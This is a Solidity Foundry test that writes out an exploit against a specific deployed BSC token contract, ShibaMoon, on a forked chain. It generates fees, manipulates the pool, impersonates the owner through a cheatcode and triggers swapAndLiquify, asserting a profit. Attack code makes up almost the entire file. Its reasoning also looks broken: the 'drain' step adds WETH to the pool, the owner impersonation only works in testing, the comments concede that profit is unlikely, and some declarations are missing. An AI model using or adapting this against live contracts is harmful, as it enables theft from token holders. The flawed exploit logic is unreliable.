interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function deposit() external payable;
}

interface ShibaMoon {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function owner() external view returns (address);
    function numTokensSellToAddToLiquidity() external view returns (uint256);
    function isExcludedFromFee(address account) external view returns (bool);
    function excludeFromFee(address account) external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf7958ffc6cE46dE09e0AB69B7dA360C38b16266B;
    address attacker = address(this);
    address private constant WETH_ADDRESS = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // BSC WBNB
    address private uniswapV2Router;
    address private uniswapV2Pair;

    // Declare interfaces as state variables
    IUniswapV2Router02 private router;
    IUniswapV2Pair private pair;
    address private owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to fork mainnet at a block where this contract exists
        vm.createSelectFork(vm.envString("RPC_URL"));

        // Initialize router and pair from target contract
        uniswapV2Router = ShibaMoon(TARGET).uniswapV2Router();
        uniswapV2Pair = ShibaMoon(TARGET).uniswapV2Pair();

        // Initialize interfaces
        router = IUniswapV2Router02(uniswapV2Router);
        pair = IUniswapV2Pair(uniswapV2Pair);
        owner = ShibaMoon(TARGET).owner();

        // Label addresses for debugging
        vm.label(TARGET, "ShibaMoon");
        vm.label(uniswapV2Router, "PancakeRouter");
        vm.label(uniswapV2Pair, "SHIBAMOON-WETH Pair");
        vm.label(WETH_ADDRESS, "WETH");
        vm.label(owner, "Owner");

        // Give attacker some ETH to work with
        deal(attacker, 100 ether);

        // Give attacker some initial SHIBAMOON tokens
        // First, we need to get some from somewhere - let's buy from Uniswap
        vm.startPrank(attacker);

        // Approve router to spend ETH
        IERC20(WETH_ADDRESS).approve(address(router), type(uint256).max);

        // Swap ETH for SHIBAMOON
        address[] memory path = new address[](2);
        path[0] = WETH_ADDRESS;
        path[1] = TARGET;

        // Get some WETH first (since we have ETH)
        IERC20(WETH_ADDRESS).deposit{value: 10 ether}();

        // Swap WETH for SHIBAMOON
        router.swapExactTokensForTokens(
            5 ether,
            0,
            path,
            attacker,
            block.timestamp + 1 hours
        );

        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Check current contract token balance
        uint256 contractBalanceBefore = ShibaMoon(TARGET).balanceOf(TARGET);
        console.log("Contract token balance before:", contractBalanceBefore);
        console.log("numTokensSellToAddToLiquidity:", ShibaMoon(TARGET).numTokensSellToAddToLiquidity());

        // Step 2: If contract doesn't have enough tokens, we need to generate fees
        // We can do this by making trades that incur the 5% liquidity fee
        if (contractBalanceBefore < ShibaMoon(TARGET).numTokensSellToAddToLiquidity()) {
            console.log("Generating fees...");

            // Get more SHIBAMOON tokens first
            vm.startPrank(attacker);
            uint256 shibaBalance = ShibaMoon(TARGET).balanceOf(attacker);

            // Buy more to generate fees
            IERC20(WETH_ADDRESS).deposit{value: 5 ether}();

            address[] memory buyPath = new address[](2);
            buyPath[0] = WETH_ADDRESS;
            buyPath[1] = TARGET;

            router.swapExactTokensForTokens(
                2 ether,
                0,
                buyPath,
                attacker,
                block.timestamp + 1 hours
            );

            // Now sell some to generate fees (selling incurs 5% sell tax + 5% sell liquidity fee)
            uint256 sellAmount = ShibaMoon(TARGET).balanceOf(attacker) / 2;
            ShibaMoon(TARGET).approve(address(router), sellAmount);

            address[] memory sellPath = new address[](2);
            sellPath[0] = TARGET;
            sellPath[1] = WETH_ADDRESS;

            router.swapExactTokensForTokens(
                sellAmount,
                0,
                sellPath,
                attacker,
                block.timestamp + 1 hours
            );

            vm.stopPrank();

            // Check new contract balance
            contractBalanceBefore = ShibaMoon(TARGET).balanceOf(TARGET);
            console.log("Contract token balance after trades:", contractBalanceBefore);
        }

        // Step 3: Manipulate pool to make swap fail
        // We need to drain the WETH from the pair so the swap fails
        console.log("Manipulating pool...");

        // Get the pair reserves
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        address token0 = pair.token0();

        uint256 wethReserve;
        if (token0 == WETH_ADDRESS) {
            wethReserve = reserve0;
        } else {
            wethReserve = reserve1;
        }

        console.log("WETH reserve in pair:", wethReserve);

        // If there's WETH in the pair, we need to drain it
        // We can do this by swapping out all WETH
        if (wethReserve > 0) {
            vm.startPrank(attacker);

            // Get enough of the other token to swap for all WETH
            address otherToken = (token0 == WETH_ADDRESS) ? pair.token1() : token0;

            // Buy a large amount of the other token
            uint256 amountToSwap = wethReserve * 110 / 100; // 110% of reserve to drain completely

            // We need WETH to buy the other token
            IERC20(WETH_ADDRESS).deposit{value: amountToSwap}();

            address[] memory drainPath = new address[](2);
            drainPath[0] = WETH_ADDRESS;
            drainPath[1] = otherToken;

            // This will drain almost all WETH from the pair
            router.swapExactTokensForTokens(
                amountToSwap,
                0,
                drainPath,
                attacker,
                block.timestamp + 1 hours
            );

            vm.stopPrank();
        }

        // Step 4: Trigger swapAndLiquify
        // The contract should have enough tokens now, and swapAndLiquifyEnabled should be true
        // We need to make a transfer that's not from the pair to trigger it
        console.log("Triggering swapAndLiquify...");

        vm.startPrank(attacker);

        // Transfer tokens to someone (not the pair) to potentially trigger swapAndLiquify
        // First check if we're excluded from fee
        bool isExcluded = ShibaMoon(TARGET).isExcludedFromFee(attacker);
        console.log("Attacker excluded from fee:", isExcluded);

        if (!isExcluded) {
            // We need to be excluded from fee to avoid triggering fees ourselves
            // Try to get excluded by impersonating owner
            vm.stopPrank();
            vm.startPrank(owner);
            ShibaMoon(TARGET).excludeFromFee(attacker);
            vm.stopPrank();
            vm.startPrank(attacker);
        }

        // Make a transfer that should trigger swapAndLiquify
        // The contract checks: from != uniswapV2Pair, so we transfer from attacker to another address
        address recipient = address(0x123);
        uint256 transferAmount = 1000 * 10**6 * 10**8; // Small amount

        // Record balances before
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 contractEthBefore = address(TARGET).balance;

        ShibaMoon(TARGET).transfer(recipient, transferAmount);

        // Record balances after
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 contractEthAfter = address(TARGET).balance;

        console.log("Attacker ETH balance change:", attackerBalanceAfter - attackerBalanceBefore);
        console.log("Contract ETH balance change:", contractEthAfter - contractEthBefore);

        // The swap should have failed due to drained WETH pool, but addLiquidity may have executed
        // Check if we gained any ETH from the process (unlikely but possible if liquidity was minted incorrectly)

        vm.stopPrank();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

